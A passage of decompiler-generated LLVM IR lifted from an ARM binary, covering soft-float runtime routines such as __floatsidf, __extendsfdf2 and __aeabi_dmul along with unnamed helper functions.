  %v6_164ec = lshr i32 %v0_164ec, %v1_164e4
  store i32 %v6_164ec, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_164f4:                               ; preds = %dec_label_pc_164d8
  %v8_164d8 = icmp eq i32 %v2_164d8, 0
  %v4_164d8 = add i32 %v5_164cc, 2147483616
  %v5_164d8 = and i32 %v2_164d8, %v4_164d8
  br label %dec_label_pc_164f8

dec_label_pc_164f8:                               ; preds = %bb46, %dec_label_pc_164f4
  %v1_16504.in = phi i32 [ %v2_164d0, %bb46 ], [ %v2_164d8, %dec_label_pc_164f4 ]
  %v6_16504 = phi i32 [ %v2_164d0, %bb46 ], [ %v5_164cc, %dec_label_pc_164f4 ]
  %v2_16504.in = phi i32 [ %v5_164d0, %bb46 ], [ %v5_164d8, %dec_label_pc_164f4 ]
  %v0_16504 = phi i1 [ %v8_164d0, %bb46 ], [ %v8_164d8, %dec_label_pc_164f4 ]
  %v1_16504 = icmp slt i32 %v1_16504.in, 0
  %v2_16504 = icmp slt i32 %v2_16504.in, 0
  %v3_164f8 = xor i1 %v2_16504, %v1_16504
  %v4_164f8 = or i1 %v0_16504, %v3_164f8
  br i1 %v4_164f8, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_164f8
  %v6_164f8 = sub i32 32, %v6_16504
  store i32 %v6_164f8, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_164f8, %bb47
  %v6_164fc = shl i32 %v0_164ec, %v6_16504
  store i32 %v6_164fc, i32* %r1.global-to-local, align 4
  br i1 %v4_164f8, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_16500 = load i32, i32* @r0, align 4
  %v7_16500 = load i32, i32* @ip, align 4
  %v12_16500 = lshr i32 %v6_16500, %v7_16500
  %v13_16500 = or i32 %v12_16500, %v6_164fc
  store i32 %v13_16500, i32* %r1.global-to-local, align 4
  %v11_16504 = shl i32 %v6_16500, %v6_16504
  store i32 %v11_16504, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_164e0, %bb49
  %v6_1650c = phi i32 [ %v6_164ec, %dec_label_pc_164e0 ], [ %v13_16500, %bb49 ], [ %v6_164fc, %bb48 ]
  %v0_16508 = load i32, i32* @r4, align 4
  %v2_16508 = sub i32 %v0_16508, %v5_164cc
  store i32 %v2_16508, i32* %r4.global-to-local, align 4
  %v4_16508 = xor i32 %v0_16508, %v5_164cc
  %v5_16508 = xor i32 %v2_16508, %v0_16508
  %v6_16508 = and i32 %v5_16508, %v4_16508
  %v7_16508 = icmp slt i32 %v6_16508, 0
  %v8_16508 = icmp slt i32 %v2_16508, 0
  %v5_1650c = icmp slt i32 %v0_16508, %v5_164cc
  br i1 %v5_1650c, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_1650c = mul i32 %v2_16508, 1048576
  %v11_1650c = add i32 %v10_1650c, %v6_1650c
  %v7_16510 = load i32, i32* @r5, align 4
  %v8_16510 = or i32 %v7_16510, %v11_1650c
  store i32 %v8_16510, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_16518 = xor i1 %v8_16508, %v7_16508
  %v4_16518 = xor i1 %v3_16518, true
  call void @__pseudo_cond_branch(i1 %v4_16518, i32 %tmp33)
  %v0_1651c = load i32, i32* %r4.global-to-local, align 4
  %v2_16520 = sub i32 -32, %v0_1651c
  store i32 %v2_16520, i32* %r4.global-to-local, align 4
  %v6_16524 = icmp sgt i32 %v0_1651c, -32
  br i1 %v6_16524, label %dec_label_pc_16528, label %dec_label_pc_16568

dec_label_pc_16528:                               ; preds = %.thread8
  %v1_16528 = add i32 %v2_16520, 12
  store i32 %v1_16528, i32* %r4.global-to-local, align 4
  %v8_1652c = icmp sgt i32 %v1_16528, 0
  br i1 %v8_1652c, label %dec_label_pc_1654c, label %dec_label_pc_16530

dec_label_pc_16530:                               ; preds = %dec_label_pc_16528
  %v1_16530 = add i32 %v2_16520, 32
  %v1_16534 = sub i32 0, %v2_16520
  %v0_16538 = load i32, i32* @r0, align 4
  %v6_16538 = lshr i32 %v0_16538, %v1_16530
  %v1_1653c = load i32, i32* %r1.global-to-local, align 4
  %v7_1653c = shl i32 %v1_1653c, %v1_16534
  %v8_1653c = or i32 %v7_1653c, %v6_16538
  %v0_16540 = load i32, i32* @r5, align 4
  %v7_16540 = lshr i32 %v1_1653c, %v1_16530
  %v8_16540 = or i32 %v0_16540, %v7_16540
  store i32 %v8_16540, i32* %r1.global-to-local, align 4
  %v2_16544 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_16544, i32* %r4.global-to-local, align 4
  ret i32 %v8_1653c

dec_label_pc_1654c:                               ; preds = %dec_label_pc_16528
  %v1_1654c = sub i32 0, %v2_16520
  %v1_16550 = add i32 %v2_16520, 32
  %v0_16554 = load i32, i32* @r0, align 4
  %v6_16554 = lshr i32 %v0_16554, %v1_16550
  %v1_16558 = load i32, i32* %r1.global-to-local, align 4
  %v7_16558 = shl i32 %v1_16558, %v1_1654c
  %v8_16558 = or i32 %v7_16558, %v6_16554
  %v0_1655c = load i32, i32* @r5, align 4
  store i32 %v0_1655c, i32* %r1.global-to-local, align 4
  %v2_16560 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_16560, i32* %r4.global-to-local, align 4
  ret i32 %v8_16558

dec_label_pc_16568:                               ; preds = %.thread8
  %v0_16568 = load i32, i32* %r1.global-to-local, align 4
  %v6_16568 = lshr i32 %v0_16568, %v2_16520
  %v0_1656c = load i32, i32* @r5, align 4
  store i32 %v0_1656c, i32* %r1.global-to-local, align 4
  %v2_16570 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_16570, i32* %r4.global-to-local, align 4
  ret i32 %v6_16568

; uselistorder directives
  uselistorder i32 %v2_16520, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_16508, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16508, { 2, 0, 1, 3 }
  uselistorder i32 %v6_164fc, { 1, 0, 2 }
  uselistorder i32 %v2_164d0, { 1, 0, 2 }
  uselistorder i32 %v5_164cc, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_164b8, { 1, 0 }
  uselistorder i32 %v1_164b8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_164ac, { 1, 0 }
  uselistorder i32 %v1_164ac, { 1, 0, 2, 3 }
  uselistorder i32 %v4_164a0, { 1, 0 }
  uselistorder i32 %v0_164ec, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 0, 2, 3, 1 }
  uselistorder i32 -20, { 0, 3, 1, 2 }
  uselistorder i32 -16, { 1, 0, 10, 11, 2, 3, 13, 4, 5, 9, 12, 6, 7, 8 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_164f8, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_16578(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_16578:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_16578 = load i32, i32* @r4, align 4
  %v2_16578 = icmp eq i32 %v0_16578, 0
  %v1_1657c = xor i32 %arg3, 1048576
  store i32 %v1_1657c, i32* @r3, align 4
  br i1 %v2_16578, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_16578
  %v1_16580 = load i32, i32* @r1, align 4
  %v2_16580 = xor i32 %v1_16580, 1048576
  store i32 %v2_16580, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_16578
  %v1_16588 = load i32, i32* @r5, align 4
  %v2_16588 = add i32 %v1_16588, -1
  store i32 %v2_16588, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1658c = call i32 @function_163d0()
  store i32 %v0_1658c, i32* %r0.global-to-local, align 4
  %v0_16590 = load i32, i32* @r4, align 4
  %v0_16590.off = add i32 %v0_16590, 4194303
  %tmp = icmp ult i32 %v0_16590.off, 2097152
  %v1_16620 = load i32, i32* @r5, align 4
  %v1_16620.off = add i32 %v1_16620, 4194303
  %tmp44 = icmp ult i32 %v1_16620.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1659c

dec_label_pc_1659c:                               ; preds = %bb30
  %v4_1659c = icmp eq i32 %v1_16620, %v0_16590
  br i1 %v4_1659c, label %bb31, label %dec_label_pc_165a8

bb31:                                             ; preds = %dec_label_pc_1659c
  %v2_165a0 = load i32, i32* @r2, align 4
  %v5_165a0 = icmp eq i32 %v2_165a0, %v0_1658c
  br i1 %v5_165a0, label %dec_label_pc_165bc, label %dec_label_pc_165a8

dec_label_pc_165a8:                               ; preds = %dec_label_pc_1659c, %bb31
  %v2_165a8 = or i32 %v0_16590, %v0_1658c
  %v4_165a8 = icmp eq i32 %v2_165a8, 0
  br i1 %v4_165a8, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_165a8
  %v1_165b0 = load i32, i32* @r2, align 4
  store i32 %v1_165b0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_165a8, %bb32
  %v1_165b8 = phi i32 [ %v0_1658c, %dec_label_pc_165a8 ], [ %v1_165b0, %bb32 ]
  ret i32 %v1_165b8

dec_label_pc_165bc:                               ; preds = %bb31
  %v0_165bc = load i32, i32* @r1, align 4
  %v1_165bc = load i32, i32* @r3, align 4
  %v4_165bc = icmp eq i32 %v1_165bc, %v0_165bc
  br i1 %v4_165bc, label %dec_label_pc_165bc..thread8_crit_edge, label %bb33

dec_label_pc_165bc..thread8_crit_edge:            ; preds = %dec_label_pc_165bc
  %v0_165cc.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_165bc
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_165bc..thread8_crit_edge, %bb33
  %v0_165cc = phi i32 [ %v0_165cc.pre, %dec_label_pc_165bc..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_165cc = xor i1 %v4_165bc, true
  call void @__pseudo_cond_branch(i1 %v2_165cc, i32 %v0_165cc)
  %v0_165d0 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_165d0, 2097152
  br i1 %tmp45, label %dec_label_pc_165d8, label %dec_label_pc_165ec

dec_label_pc_165d8:                               ; preds = %.thread8
  %v0_165d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_165d8 = icmp slt i32 %v0_165d8, 0
  %v2_165d8 = mul i32 %v0_165d8, 2
  store i32 %v2_165d8, i32* %r0.global-to-local, align 4
  %v0_165dc = load i32, i32* @r1, align 4
  %v3_165dc = mul i32 %v0_165dc, 2
  %v4_165dc = zext i1 %v1_165d8 to i32
  %v5_165dc = or i32 %v3_165dc, %v4_165dc
  %v9_165dc = icmp ule i32 %v5_165dc, %v0_165dc
  %v10_165dc = icmp ult i32 %v3_165dc, %v0_165dc
  %v11_165dc = select i1 %v1_165d8, i1 %v9_165dc, i1 %v10_165dc
  br i1 %v11_165dc, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_165d8
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_165d8, %bb34
  ret i32 %v2_165d8

dec_label_pc_165ec:                               ; preds = %.thread8
  %v2_165ec = icmp ugt i32 %v0_165d0, -4194305
  br i1 %v2_165ec, label %dec_label_pc_165ec..thread9_crit_edge, label %bb36

dec_label_pc_165ec..thread9_crit_edge:            ; preds = %dec_label_pc_165ec
  %v0_165f8.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_165ec
  %v1_165f0 = load i32, i32* @r1, align 4
  %v2_165f0 = add i32 %v1_165f0, 1048576
  store i32 %v2_165f0, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_165ec..thread9_crit_edge, %bb36
  %v0_165f8 = phi i32 [ %v0_165f8.pre, %dec_label_pc_165ec..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_165f8 = xor i1 %v2_165ec, true
  call void @__pseudo_cond_branch(i1 %v2_165f8, i32 %v0_165f8)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1662c.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1662c.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_16618 = load i32, i32* @r3, align 4
  %v1_1661c = load i32, i32* @r2, align 4
  store i32 %v1_1661c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1662c23 = phi i32 [ %v1_1662c.pre, %.thread14 ], [ %v1_16618, %bb37 ]
  %v1_16628 = phi i32 [ %v0_1658c, %.thread14 ], [ %v1_1661c, %bb37 ]
  store i32 %v1_16628, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_16638 = phi i32 [ %v1_1662c23, %bb38 ], [ %v1_1662c.pre, %.thread11 ]
  %v1_16640 = phi i32 [ %v1_16628, %bb38 ], [ %v0_1658c, %.thread11 ]
  %v4_1662c = mul i32 %v1_16638, 4096
  %v5_1662c = or i32 %v4_1662c, %v1_16640
  %v7_1662c = icmp eq i32 %v5_1662c, 0
  br i1 %v7_1662c, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_16630 = load i32, i32* @r2, align 4
  %v2_16630 = load i32, i32* @r3, align 4
  %v5_16630 = mul i32 %v2_16630, 4096
  %v6_16630 = or i32 %v5_16630, %v1_16630
  %v8_16630 = icmp eq i32 %v6_16630, 0
  br i1 %v8_16630, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_16634 = icmp eq i32 %v2_16630, %v1_16638
  br i1 %v5_16634, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_16640

; uselistorder directives
  uselistorder i32 %v1_1662c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_165dc, { 1, 2, 0 }
  uselistorder i32 %v2_165d8, { 1, 0 }
  uselistorder i1 %v1_165d8, { 1, 0 }
  uselistorder i32 %v0_165d0, { 1, 0 }
  uselistorder i1 %v4_165bc, { 1, 0 }
  uselistorder i32 %v0_16590, { 2, 0, 1 }
  uselistorder i32 %v0_1658c, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_165a8, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_16644 = icmp eq i32 %arg1, 0
  br i1 %v2_16644, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1664c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16644, i32 %v0_1664c)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_16664 = call i32 @function_16484()
  ret i32 %v0_16664

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_16668 = icmp eq i32 %arg1, 0
  br i1 %v2_16668, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_16670 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16668, i32 %v0_16670)
  store i32 1074, i32* @r4, align 4
  %v1_16680 = and i32 %arg1, -2147483648
  store i32 %v1_16680, i32* @r5, align 4
  %v2_16680 = icmp eq i32 %v1_16680, 0
  br i1 %v2_16680, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_16684 = sub i32 0, %arg1
  store i32 %v2_16684, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1668c = call i32 @function_16484()
  ret i32 %v0_1668c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_16690 = mul i32 %arg1, 2
  store i32 %v2_16690, i32* %r2.global-to-local, align 4
  %v4_16690 = icmp eq i32 %v2_16690, 0
  %v1_16694 = and i32 %v2_16690, 4
  %v2_16694 = icmp ne i32 %v1_16694, 0
  %v3_16694 = sdiv i32 %v2_16690, 8
  %v3_16698 = zext i1 %v2_16694 to i32
  %v6_16698 = zext i32 %v3_16694 to i64
  %v7_16698 = sub nsw i32 33, %v3_16694
  %v8_16698 = zext i32 %v7_16698 to i64
  %v9_16698 = shl i64 %v6_16698, %v8_16698
  %v10_16698 = sub nsw i32 32, %v3_16694
  %v11_16698 = shl i32 %v3_16698, %v10_16698
  %v12_16698 = zext i32 %v11_16698 to i64
  %v14_16698 = or i64 %v12_16698, %v9_16698
  %v15_16698 = trunc i64 %v14_16698 to i32
  store i32 %v15_16698, i32* %r1.global-to-local, align 4
  %v3_1669c = mul i32 %arg1, 536870912
  store i32 %v3_1669c, i32* @r0, align 4
  br i1 %v4_16690, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_166a0 = and i32 %v2_16690, -16777216
  store i32 %v2_166a0, i32* @r3, align 4
  %v4_166a0 = icmp eq i32 %v2_166a0, 0
  br i1 %v4_166a0, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_166a4 = icmp ugt i32 %v2_16690, -16777217
  br i1 %v4_166a4, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_166a8 = xor i32 %v15_16698, 939524096
  store i32 %v2_166a8, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_166ac = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_166ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_166ac, i32 %v0_166ac)
  %v0_166b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_166b0 = icmp eq i32 %v0_166b0, 0
  br i1 %v2_166b0, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_166b4 = load i32, i32* @r3, align 4
  %v4_166b4 = icmp eq i32 %v1_166b4, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_166b8 = phi i1 [ true, %.thread1 ], [ %v4_166b4, %bb9 ]
  %v0_166b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_166b8, i32 %v0_166b8)
  store i32 896, i32* @r4, align 4
  %v0_166c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_166c4 = and i32 %v0_166c4, -2147483648
  store i32 %v1_166c4, i32* @r5, align 4
  %tmp = bitcast i32 %v0_166c4 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_166c8 = bitcast float %tmp11 to i32
  store i32 %v1_166c8, i32* @r1, align 4
  %v0_166cc = call i32 @function_16484()
  ret i32 %v0_166cc

; uselistorder directives
  uselistorder i32 %v3_16694, { 1, 2, 0 }
  uselistorder i32 %v2_16690, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_16484, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_166d0 = or i32 %arg2, %arg1
  %v4_166d0 = icmp eq i32 %v2_166d0, 0
  %v0_166d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_166d0, i32 %v0_166d4)
  store i32 0, i32* @r5, align 4
  %v0_166e0 = call i32 @function_16700()
  ret i32 %v0_166e0
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_166e4 = or i32 %arg2, %arg1
  %v4_166e4 = icmp eq i32 %v2_166e4, 0
  %v0_166e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_166e4, i32 %v0_166e8)
  %v1_166f4 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_166f4, i32 ptrtoint (i32* @global_var_16700.738 to i32))
  %v1_166f8 = sub i32 0, %arg1
  ret i32 %v1_166f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_16700() local_unnamed_addr {
dec_label_pc_16700:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_16708 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_16708, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_16424.736 to i32))
  %tmp6 = icmp ult i32 %v0_16708, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_16700
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_16700, %bb
  %v1_16720 = phi i32 [ 3, %dec_label_pc_16700 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_16708, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_16720 = add nuw nsw i32 %v1_16720, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_16724 = phi i32 [ %v1_16720, %bb3 ], [ %v2_16720, %bb4 ]
  %not. = icmp slt i32 %v0_16708, 0
  %v4_16724 = zext i1 %not. to i32
  %v5_16724 = add nsw i32 %v0_16724, %v4_16724
  %v1_16728 = sub nsw i32 32, %v5_16724
  %v0_1672c = load i32, i32* @r0, align 4
  %v6_1672c = shl i32 %v0_1672c, %v1_16728
  store i32 %v6_1672c, i32* @ip, align 4
  %v6_16730 = lshr i32 %v0_1672c, %v5_16724
  %v1_16734 = load i32, i32* @r1, align 4
  %v7_16734 = shl i32 %v1_16734, %v1_16728
  %v8_16734 = or i32 %v7_16734, %v6_16730
  %v6_16738 = lshr i32 %v1_16734, %v5_16724
  %v0_1673c = load i32, i32* %r4.global-to-local, align 4
  %v2_1673c = add i32 %v0_1673c, %v5_16724
  store i32 %v2_1673c, i32* @r4, align 4
  %v4_16740 = sext i32 %v8_16734 to i64
  %v5_16740 = call i32 @function_16424(i64 %v4_16740, i32 %v6_16738, i32 %v5_16724, i32 %v1_16728)
  ret i32 %v5_16740

; uselistorder directives
  uselistorder i32 %v5_16724, { 2, 0, 1, 3, 4 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16744 = load i32, i32* @r4, align 4
  store i32 %v3_16744, i32* %stack_var_-16, align 4
  %v12_16744 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_16750 = udiv i32 %arg2, 1048576
  %v5_16750 = urem i32 %v4_16750, 2048
  store i32 %v5_16750, i32* %r4.global-to-local, align 4
  %v6_16750 = icmp eq i32 %v5_16750, 0
  br i1 %v6_16750, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_16754 = udiv i32 %arg4, 1048576
  %v6_16754 = urem i32 %v5_16754, 2048
  store i32 %v6_16754, i32* @r5, align 4
  %v7_16754 = icmp eq i32 %v6_16754, 0
  br i1 %v7_16754, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_16758 = icmp eq i32 %v5_16750, 2047
  br i1 %v5_16758, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1675c = icmp eq i32 %v6_16754, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_16760 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1675c, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_16764.741 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_16760, i32 ptrtoint (i32* @global_var_1693c.739 to i32))
  %v0_16764 = load i32, i32* %r4.global-to-local, align 4
  %v1_16764 = load i32, i32* @r5, align 4
  %v2_16764 = add i32 %v1_16764, %v0_16764
  store i32 %v2_16764, i32* %r4.global-to-local, align 4
  %v2_16768 = xor i32 %arg4, %arg2
  %v1_1676c = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1676c, -2097152
  %v5_1676c = add i32 %tmp51, -1
  %v6_1676c = and i32 %v5_1676c, %arg2
  store i32 %v6_1676c, i32* %r1.global-to-local, align 4
  %v6_16770 = and i32 %v5_1676c, %arg4
  %v5_16774 = mul i32 %arg2, 4096
  %v6_16774 = or i32 %v5_16774, %tmp32
  %v8_16774 = icmp eq i32 %v6_16774, 0
  br i1 %v8_16774, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1677c5 = or i32 %v6_1676c, 1048576
  store i32 %v1_1677c5, i32* %r1.global-to-local, align 4
  %v1_167807 = or i32 %v6_16770, 1048576
  br label %dec_label_pc_16800

bb40:                                             ; preds = %.thread2
  %v6_16778 = mul i32 %arg4, 4096
  %v7_16778 = or i32 %v6_16778, %arg3
  %v9_16778 = icmp eq i32 %v7_16778, 0
  %v1_1677c = or i32 %v6_1676c, 1048576
  store i32 %v1_1677c, i32* %r1.global-to-local, align 4
  %v1_16780 = or i32 %v6_16770, 1048576
  br i1 %v9_16778, label %dec_label_pc_16800, label %dec_label_pc_16788

dec_label_pc_16788:                               ; preds = %bb40
  %v6_16788 = mul nuw i64 %tmp, %arg1
  %v7_16788 = udiv i64 %v6_16788, 4294967296
  %v9_16788 = trunc i64 %v6_16788 to i32
  store i32 %v9_16788, i32* %ip.global-to-local, align 4
  %v7_16790 = zext i32 %v1_1677c to i64
  %v11_16790 = mul nuw nsw i64 %v7_16790, %tmp
  %v12_16790 = add i64 %v11_16790, %v7_16788
  %v1_16794 = and i32 %v2_16768, -2147483648
  %v10_16798 = zext i32 %v1_16780 to i64
  %v11_16798 = mul nuw i64 %v10_16798, %arg1
  %v12_16798 = add i64 %v12_16790, %v11_16798
  %v13_16798 = udiv i64 %v12_16798, 4294967296
  %v15_16798 = trunc i64 %v12_16798 to i32
  %v10_167a0 = mul nuw i64 %v10_16798, %v7_16790
  %v11_167a0 = add i64 %v13_16798, %v10_167a0
  %v12_167a0 = udiv i64 %v11_167a0, 4294967296
  %v13_167a0 = trunc i64 %v12_167a0 to i32
  %v14_167a0 = trunc i64 %v11_167a0 to i32
  %v2_167a4 = icmp eq i32 %v9_16788, 0
  br i1 %v2_167a4, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_16788
  %v2_167a8 = or i32 %v15_16798, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_16788, %bb41
  %storemerge = phi i32 [ %v2_167a8, %bb41 ], [ %v15_16798, %dec_label_pc_16788 ]
  %v0_167bc = phi i32 [ %v2_167a8, %bb41 ], [ %v15_16798, %dec_label_pc_16788 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_167ac = add i32 %v2_16764, -255
  %v2_167b0 = icmp ugt i32 %v13_167a0, 511
  %v2_167b4 = icmp eq i1 %v2_167b0, false
  %v3_167b4 = add i32 %v2_16764, -1023
  %v5_167b4 = sext i1 %v2_167b4 to i32
  %v6_167b4 = add i32 %v3_167b4, %v5_167b4
